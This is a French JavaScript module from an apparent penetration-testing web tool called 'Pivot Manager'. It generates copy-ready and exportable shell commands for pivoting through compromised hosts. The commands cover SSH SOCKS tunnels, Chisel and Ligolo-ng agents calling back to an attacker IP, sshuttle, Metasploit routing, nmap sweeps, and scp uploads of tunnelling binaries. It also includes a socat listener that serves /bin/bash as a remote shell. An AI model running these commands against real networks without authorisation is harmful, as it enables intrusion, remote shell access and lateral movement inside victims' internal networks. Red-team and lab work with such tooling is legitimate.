/**
 * Pivot Manager - Module de Génération de Commandes
 * Génération de commandes spécialisées pour chaque technique de pivotement
 */

class CommandGenerator {
    constructor(core) {
        this.core = core;
        this.generatedCommands = {
            attacker: [],
            pivot: [],
            target: []
        };
        this.currentPlatform = 'linux'; // linux, windows, macos
    }

    async init() {
        console.log('⚡ Initialisation du Command Generator...');
        this.setupEventListeners();
    }

    setupEventListeners() {
        // Boutons de copie pour chaque section
        document.addEventListener('click', (e) => {
            if (e.target.matches('.copy-command-btn')) {
                this.copyCommand(e.target.dataset.command);
            }
        });
    }

    generate() {
        if (!this.core.modules.techniqueManager.selectedTechnique) {
            this.core.showNotification('Aucune technique sélectionnée', 'warning');
            return;
        }

        if (!this.core.selectedNodes.length) {
            this.core.showNotification('Aucun node sélectionné', 'warning');
            return;
        }

        this.core.showNotification('Génération des commandes...', 'info');

        try {
            this.generateCommandsForTechnique();
            this.displayCommands();
            this.showCommandOutput();
            
            this.core.showNotification('Commandes générées avec succès', 'success');
        } catch (error) {
            console.error('Erreur génération commandes:', error);
            this.core.showNotification('Erreur lors de la génération des commandes', 'error');
        }
    }

    generateCommandsForTechnique() {
        const technique = this.core.modules.techniqueManager.selectedTechnique;
        const config = this.core.modules.techniqueManager.currentConfiguration;
        
        // Réinitialiser les commandes
        this.generatedCommands = {
            attacker: [],
            pivot: [],
            target: []
        };

        // Générer selon la technique sélectionnée
        switch (technique) {
            case 'ssh':
                this.generateSSHCommands(config);
                break;
            case 'chisel':
                this.generateChiselCommands(config);
                break;
            case 'ligolo':
                this.generateLigoloCommands(config);
                break;
            case 'sshuttle':
                this.generateSSHuttleCommands(config);
                break;
            case 'socat':
                this.generateSocatCommands(config);
                break;
            case 'metasploit':
                this.generateMetasploitCommands(config);
                break;
            default:
                throw new Error(`Technique ${technique} non supportée`);
        }

        // Ajouter les commandes de test communes
        this.addTestCommands();
    }

    generateSSHCommands(config) {
        const pivotNode = this.core.selectedNodes[0];
        const attackerIP = this.core.config.attackerIP;
        
        // Commandes pour l'attaquant
        if (config.type === 'dynamic') {
            this.generatedCommands.attacker.push({
                title: 'SSH Dynamic Port Forward (SOCKS Proxy)',
                description: 'Crée un proxy SOCKS pour router le trafic',
                command: `ssh -D ${config.localPort} -N -f ${config.username}@${pivotNode.ip}`,
                comment: 'Proxy SOCKS disponible sur 127.0.0.1:' + config.localPort
            });
        } else if (config.type === 'local') {
            this.generatedCommands.attacker.push({
                title: 'SSH Local Port Forward',
                description: 'Forward un port local vers un port distant',
                command: `ssh -L ${config.localPort}:TARGET_IP:TARGET_PORT -N -f ${config.username}@${pivotNode.ip}`,
                comment: 'Remplacer TARGET_IP:TARGET_PORT par la destination'
            });
        } else if (config.type === 'remote') {
            this.generatedCommands.attacker.push({
                title: 'SSH Remote Port Forward',
                description: 'Expose un port local sur la machine distante',
                command: `ssh -R ${config.localPort}:127.0.0.1:TARGET_PORT -N -f ${config.username}@${pivotNode.ip}`,
                comment: 'Remplacer TARGET_PORT par le port à exposer'
            });
        }

        // Options supplémentaires SSH
        const sshOptions = [];
        if (config.compression) sshOptions.push('-C');
        if (config.keepAlive) sshOptions.push('-o ServerAliveInterval=30');
        sshOptions.push('-o StrictHostKeyChecking=no');
        
        if (sshOptions.length > 0) {
            this.generatedCommands.attacker.push({
                title: 'SSH avec options recommandées',
                description: 'Version avec compression et keep-alive',
                command: `ssh ${sshOptions.join(' ')} -D ${config.localPort} -N -f ${config.username}@${pivotNode.ip}`,
                comment: 'Version optimisée avec toutes les options'
            });
        }

        // Configuration de proxychains
        this.generatedCommands.attacker.push({
            title: 'Configuration Proxychains',
            description: 'Ajouter à /etc/proxychains.conf',
            command: `echo "socks5 127.0.0.1 ${config.localPort}" >> /etc/proxychains.conf`,
            comment: 'Permet d\'utiliser proxychains avec le tunnel SSH'
        });

        // Commandes pour vérification
        this.generatedCommands.attacker.push({
            title: 'Test du tunnel SSH',
            description: 'Vérifier que le tunnel fonctionne',
            command: `ss -tlnp | grep :${config.localPort}`,
            comment: 'Doit afficher le port en écoute'
        });
    }

    generateChiselCommands(config) {
        const pivotNode = this.core.selectedNodes[0];
        const attackerIP = this.core.config.attackerIP;
        
        if (config.reverse) {
            // Mode reverse - serveur sur l'attaquant
            this.generatedCommands.attacker.push({
                title: 'Chisel Server (Attaquant)',
                description: 'Démarrer le serveur Chisel sur la machine attaquante',
                command: `./chisel server -p ${config.serverPort} --reverse`,
                comment: `Serveur en écoute sur le port ${config.serverPort}`
            });

            this.generatedCommands.pivot.push({
                title: 'Chisel Client (Pivot)',
                description: 'Connecter le client depuis le pivot',
                command: `./chisel client ${attackerIP}:${config.serverPort} R:${config.clientPort}:socks`,
                comment: 'Crée un proxy SOCKS reverse sur l\'attaquant'
            });
        } else {
            // Mode normal - serveur sur le pivot
            this.generatedCommands.pivot.push({
                title: 'Chisel Server (Pivot)',
                description: 'Démarrer le serveur Chisel sur le pivot',
                command: `./chisel server -p ${config.serverPort} --socks5`,
                comment: `Serveur SOCKS5 sur le port ${config.serverPort}`
            });

            this.generatedCommands.attacker.push({
                title: 'Chisel Client (Attaquant)',
                description: 'Se connecter au serveur Chisel',
                command: `./chisel client ${pivotNode.ip}:${config.serverPort} ${config.clientPort}:socks`,
                comment: `Proxy SOCKS local sur le port ${config.clientPort}`
            });
        }

        // Commandes d'authentification si activée
        if (config.auth) {
            const authKey = this.generateRandomString(16);
            this.generatedCommands.attacker.push({
                title: 'Chisel avec authentification',
                description: 'Version sécurisée avec clé',
                command: `./chisel server -p ${config.serverPort} --reverse --auth="${authKey}"`,
                comment: `Clé d'authentification: ${authKey}`
            });
        }

        // Upload du binaire Chisel
        this.generatedCommands.attacker.push({
            title: 'Upload Chisel sur le pivot',
            description: 'Transférer le binaire Chisel',
            command: `scp ./chisel ${config.username}@${pivotNode.ip}:/tmp/chisel`,
            comment: 'Ajuster le chemin selon vos besoins'
        });
    }

    generateLigoloCommands(config) {
        const pivotNode = this.core.selectedNodes[0];
        const attackerIP = this.core.config.attackerIP;

        // Proxy Ligolo sur l'attaquant
        this.generatedCommands.attacker.push({
            title: 'Ligolo-ng Proxy (Attaquant)',
            description: 'Démarrer le proxy Ligolo',
            command: `./proxy -selfcert`,
            comment: 'Proxy en écoute avec certificat auto-signé'
        });

        // Interface TUN sur l'attaquant
        if (config.enableTUN) {
            this.generatedCommands.attacker.push({
                title: 'Créer interface TUN',
                description: 'Interface réseau virtuelle pour Ligolo',
                command: `sudo ip tuntap add user $USER mode tun ${config.tunnelInterface}`,
                comment: `Interface TUN: ${config.tunnelInterface}`
            });

            this.generatedCommands.attacker.push({
                title: 'Configurer interface TUN',
                description: 'Activer l\'interface TUN',
                command: `sudo ip link set ${config.tunnelInterface} up`,
                comment: 'Activation de l\'interface'
            });
        }

        // Agent sur le pivot
        this.generatedCommands.pivot.push({
            title: 'Ligolo-ng Agent (Pivot)',
            description: 'Connecter l\'agent au proxy',
            command: `./agent -connect ${attackerIP}:${config.agentPort} -ignore-cert`,
            comment: 'Agent qui se connecte au proxy'
        });

        // Commandes de routage dans le proxy
        this.generatedCommands.attacker.push({
            title: 'Commandes Ligolo Proxy',
            description: 'Commandes à exécuter dans l\'interface Ligolo',
            command: `session
start
listener_add --addr 0.0.0.0:${config.proxyPort} --to 127.0.0.1:1080`,
            comment: 'Commandes interactives dans ligolo-ng'
        });

        // Upload des binaires
        this.generatedCommands.attacker.push({
            title: 'Upload Agent Ligolo',
            description: 'Transférer l\'agent sur le pivot',
            command: `scp ./agent ${config.username}@${pivotNode.ip}:/tmp/agent`,
            comment: 'Transférer le binaire agent'
        });
    }

    generateSSHuttleCommands(config) {
        const pivotNode = this.core.selectedNodes[0];

        // Commande SSHuttle principale
        const subnets = Array.isArray(config.subnets) ? config.subnets.join(' ') : config.subnets;
        let sshuttleCmd = `sshuttle -r ${config.username}@${pivotNode.ip} ${subnets}`;

        if (config.dns) sshuttleCmd += ' --dns';
        if (config.daemon) sshuttleCmd += ' -D';
        if (config.verbose) sshuttleCmd += ' -v';

        this.generatedCommands.attacker.push({
            title: 'SSHuttle VPN',
            description: 'Tunneling VPN transparent via SSH',
            command: sshuttleCmd,
            comment: 'Route automatiquement le trafic vers les sous-réseaux spécifiés'
        });

        // Version avec exclusions
        this.generatedCommands.attacker.push({
            title: 'SSHuttle avec exclusions',
            description: 'Exclure certaines IPs du tunneling',
            command: `sshuttle -r ${config.username}@${pivotNode.ip} ${subnets} --exclude=${pivotNode.ip}`,
            comment: 'Évite de router le trafic SSH lui-même'
        });

        // Test de connectivité
        if (Array.isArray(config.subnets) && config.subnets.length > 0) {
            const firstSubnet = config.subnets[0];
            const testIP = this.getFirstIPFromSubnet(firstSubnet);
            if (testIP) {
                this.generatedCommands.attacker.push({
                    title: 'Test de connectivité',
                    description: 'Tester que le VPN fonctionne',
                    command: `ping -c 3 ${testIP}`,
                    comment: `Test vers ${testIP} dans ${firstSubnet}`
                });
            }
        }
    }

    generateSocatCommands(config) {
        const pivotNode = this.core.selectedNodes[0];

        // Relay TCP simple
        this.generatedCommands.pivot.push({
            title: 'SOCAT TCP Relay (Pivot)',
            description: 'Relay TCP vers une cible',
            command: `socat ${config.protocol.toUpperCase()}-LISTEN:${config.listenPort}${config.fork ? ',fork' : ''} ${config.protocol.toUpperCase()}:TARGET_IP:${config.targetPort}`,
            comment: 'Remplacer TARGET_IP par l\'IP de destination'
        });

        // Shell reverse
        this.generatedCommands.pivot.push({
            title: 'SOCAT Reverse Shell (Pivot)',
            description: 'Shell reverse via SOCAT',
            command: `socat TCP-LISTEN:${config.listenPort},fork EXEC:/bin/bash`,
            comment: 'Shell en écoute sur le pivot'
        });

        this.generatedCommands.attacker.push({
            title: 'Connexion au shell SOCAT',
            description: 'Se connecter au shell reverse',
            command: `socat - TCP:${pivotNode.ip}:${config.listenPort}`,
            comment: 'Connexion au shell depuis l\'attaquant'
        });

        // Port forwarding bidirectionnel
        this.generatedCommands.pivot.push({
            title: 'SOCAT Port Forward',
            description: 'Forward bidirectionnel de port',
            command: `socat TCP-LISTEN:${config.listenPort},fork TCP:TARGET_IP:TARGET_PORT`,
            comment: 'Forward transparent de port'
        });
    }

    generateMetasploitCommands(config) {
        const pivotNode = this.core.selectedNodes[0];

        // Route via session Meterpreter
        this.generatedCommands.attacker.push({
            title: 'Ajouter Route Metasploit',
            description: 'Router via session Meterpreter',
            command: `route add ${config.routeSubnet} ${config.sessionId}`,
            comment: 'Commande dans msfconsole'
        });

        // Port forwarding Meterpreter
        this.generatedCommands.attacker.push({
            title: 'Port Forward Meterpreter',
            description: 'Forward de port via Meterpreter',
            command: `portfwd add -l ${config.socksPort} -p TARGET_PORT -r TARGET_IP`,
            comment: 'Commande dans session Meterpreter'
        });

        // Proxy SOCKS via Metasploit
        this.generatedCommands.attacker.push({
            title: 'Proxy SOCKS Metasploit',
            description: 'Proxy SOCKS via auxiliary module',
            command: `use auxiliary/server/socks_proxy
set SRVPORT ${config.socksPort}
set VERSION 5
run -j`,
            comment: 'Module SOCKS proxy en arrière-plan'
        });

        // AutoRoute pour automatiser
        this.generatedCommands.attacker.push({
            title: 'AutoRoute Metasploit',
            description: 'Module autoroute pour routage automatique',
            command: `use post/multi/manage/autoroute
set SESSION ${config.sessionId}
set SUBNET ${config.routeSubnet}
run`,
            comment: 'Configuration automatique du routage'
        });
    }

    addTestCommands() {
        const technique = this.core.modules.techniqueManager.selectedTechnique;
        
        // Commandes de test communes
        this.generatedCommands.attacker.push({
            title: 'Test de connectivité réseau',
            description: 'Vérifier l\'accès aux réseaux internes',
            command: 'nmap -sn 192.168.1.0/24',
            comment: 'Scan ping du réseau interne (adapter le subnet)'
        });

        // Test spécifique selon la technique
        if (['ssh', 'chisel', 'ligolo'].includes(technique)) {
            const config = this.core.modules.techniqueManager.currentConfiguration;
            const port = config.localPort || config.clientPort || 1080;
            
            this.generatedCommands.attacker.push({
                title: 'Test proxy SOCKS',
                description: 'Tester le proxy via curl',
                command: `curl --socks5-hostname 127.0.0.1:${port} http://httpbin.org/ip`,
                comment: 'Vérifier que le proxy fonctionne'
            });
        }
    }

    displayCommands() {
        // Actualiser l'affichage des commandes selon l'onglet sélectionné
        this.showCommands('attacker');
    }

    showCommands(target) {
        const container = document.getElementById('commandsDisplay');
        if (!container) return;

        const commands = this.generatedCommands[target] || [];
        
        // Mettre à jour les boutons actifs
        document.querySelectorAll('.btn-group button').forEach(btn => {
            btn.classList.remove('active');
        });
        document.querySelector(`[onclick="pivotManager.showCommands('${target}')"]`)?.classList.add('active');

        if (commands.length === 0) {
            container.innerHTML = `
                <div class="text-center text-muted py-4">
                    <i class="fas fa-info-circle"></i><br>
                    Aucune commande générée pour ${this.getTargetLabel(target)}
                </div>
            `;
            return;
        }

        let html = '';
        commands.forEach((cmd, index) => {
            html += this.generateCommandBlock(cmd, target, index);
        });

        container.innerHTML = html;
    }

    generateCommandBlock(cmd, target, index) {
        const commandId = `${target}-${index}`;
        return `
            <div class="command-block mb-4">
                <div class="d-flex justify-content-between align-items-start mb-2">
                    <h6 class="command-title">
                        <i class="fas fa-terminal"></i> ${cmd.title}
                    </h6>
                    <button class="btn btn-sm btn-outline-primary copy-command-btn" 
                            data-command="${this.escapeHtml(cmd.command)}"
                            title="Copier la commande">
                        <i class="fas fa-copy"></i>
                    </button>
                </div>
                <p class="text-muted mb-2">${cmd.description}</p>
                <div class="command-output">
                    <pre><code>${this.escapeHtml(cmd.command)}</code></pre>
                </div>
                ${cmd.comment ? `<small class="text-info"><i class="fas fa-info-circle"></i> ${cmd.comment}</small>` : ''}
            </div>
        `;
    }

    showCommandOutput() {
        const section = document.getElementById('commandOutput');
        if (section) {
            section.style.display = 'block';
        }
    }

    copyCommand(command) {
        navigator.clipboard.writeText(command).then(() => {
            this.core.showNotification('Commande copiée', 'success');
        }).catch(() => {
            this.core.showNotification('Erreur lors de la copie', 'error');
        });
    }

    copyAll() {
        const allCommands = [];
        
        ['attacker', 'pivot', 'target'].forEach(target => {
            const commands = this.generatedCommands[target];
            if (commands.length > 0) {
                allCommands.push(`# === ${this.getTargetLabel(target).toUpperCase()} ===`);
                commands.forEach(cmd => {
                    allCommands.push(`# ${cmd.title}`);
                    allCommands.push(`# ${cmd.description}`);
                    allCommands.push(cmd.command);
                    if (cmd.comment) {
                        allCommands.push(`# ${cmd.comment}`);
                    }
                    allCommands.push('');
                });
            }
        });

        if (allCommands.length > 0) {
            navigator.clipboard.writeText(allCommands.join('\n')).then(() => {
                this.core.showNotification('Toutes les commandes copiées', 'success');
            }).catch(() => {
                this.core.showNotification('Erreur lors de la copie', 'error');
            });
        }
    }

    exportScript() {
        const technique = this.core.modules.techniqueManager.selectedTechnique;
        const script = this.generateExecutableScript();
        
        const blob = new Blob([script], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `pivot-${technique}-${new Date().toISOString().split('T')[0]}.sh`;
        a.click();
        URL.revokeObjectURL(url);

        this.core.showNotification('Script exporté', 'success');
    }

    generateExecutableScript() {
        const technique = this.core.modules.techniqueManager.selectedTechnique;
        const config = this.core.modules.techniqueManager.currentConfiguration;
        
        let script = `#!/bin/bash\n`;
        script += `# Pivot Manager - Script ${technique.toUpperCase()}\n`;
        script += `# Généré le ${new Date().toLocaleString()}\n`;
        script += `# Configuration: ${JSON.stringify(config, null, 2).replace(/\n/g, '\n# ')}\n\n`;
        
        script += `set -e\n`;
        script += `echo "🚀 Démarrage du script de pivotement ${technique.toUpperCase()}"\n\n`;

        // Ajouter les commandes pour l'attaquant
        const attackerCommands = this.generatedCommands.attacker;
        if (attackerCommands.length > 0) {
            script += `# ===== COMMANDES ATTAQUANT =====\n`;
            attackerCommands.forEach(cmd => {
                script += `echo "Exécution: ${cmd.title}"\n`;
                if (cmd.comment) {
                    script += `echo "Note: ${cmd.comment}"\n`;
                }
                script += `${cmd.command}\n\n`;
            });
        }

        script += `echo "✅ Script terminé avec succès"\n`;
        return script;
    }

    // Méthodes utilitaires
    getTargetLabel(target) {
        const labels = {
            attacker: 'Attaquant',
            pivot: 'Pivot',
            target: 'Cible'
        };
        return labels[target] || target;
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    generateRandomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    getFirstIPFromSubnet(subnet) {
        try {
            const [network, mask] = subnet.split('/');
            const parts = network.split('.');
            if (parts.length === 4) {
                // Retourner la première IP utilisable
                const lastOctet = parseInt(parts[3]);
                parts[3] = (lastOctet + 1).toString();
                return parts.join('.');
            }
        } catch (error) {
            console.warn('Erreur parsing subnet:', error);
        }
        return null;
    }

    // Méthodes pour les templates de commandes
    getCommandTemplate(technique, platform = 'linux') {
        const templates = {
            ssh: {
                linux: {
                    dynamic: 'ssh -D {localPort} -N -f {username}@{target}',
                    local: 'ssh -L {localPort}:{remoteHost}:{remotePort} -N -f {username}@{target}',
                    remote: 'ssh -R {remotePort}:127.0.0.1:{localPort} -N -f {username}@{target}'
                },
                windows: {
                    dynamic: 'ssh.exe -D {localPort} -N {username}@{target}',
                    local: 'ssh.exe -L {localPort}:{remoteHost}:{remotePort} -N {username}@{target}'
                }
            },
            chisel: {
                linux: {
                    server: './chisel server -p {serverPort} --socks5',
                    client: './chisel client {serverHost}:{serverPort} {localPort}:socks'
                },
                windows: {
                    server: 'chisel.exe server -p {serverPort} --socks5',
                    client: 'chisel.exe client {serverHost}:{serverPort} {localPort}:socks'
                }
            }
        };
        
        return templates[technique]?.[platform] || {};
    }

    interpolateTemplate(template, variables) {
        let result = template;
        Object.entries(variables).forEach(([key, value]) => {
            result = result.replace(new RegExp(`{${key}}`, 'g'), value);
        });
        return result;
    }
}

// Rendre la classe disponible globalement
window.CommandGenerator = CommandGenerator; 